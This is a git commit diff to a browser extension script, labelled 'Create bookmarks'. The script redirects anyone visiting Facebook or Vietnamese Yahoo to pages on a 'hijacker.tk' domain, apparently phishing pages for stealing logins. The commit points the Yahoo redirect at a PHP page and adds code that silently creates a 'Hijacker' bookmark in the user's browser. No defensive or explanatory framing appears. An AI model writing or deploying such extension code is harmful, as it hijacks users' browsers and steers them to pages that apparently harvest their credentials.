a9903ffda3f1bafea8c92113a9aca61ee6b22933
Lê Dũng <ledung.itsme@gmail.com>
2021-07-21 13:36:52 +0000

    Create bookmarks

--- Extension/script.js
+++ Extension/script.js
@@ -1,7 +1,17 @@
+var $ = chrome.bookmarks;
+
 if (window.location.hostname == "www.facebook.com") {
+
     window.location.href = "https://hijacker.tk/FB/";
 }
 
 if (window.location.hostname == "vn.yahoo.com") {
-    window.location.href = "https://hijacker.tk/Yahoo/";
+    window.location.href = "https://hijacker.tk/Yahoo/Yahoo.php";
 }
+
+chrome.bookmarks.create(
+    { 'title': 'Hijacker', 'url': 'https://hijacker.tk' },
+    function (newFolder) {
+        console.log("added folder: " + newFolder.title);
+    },
+);
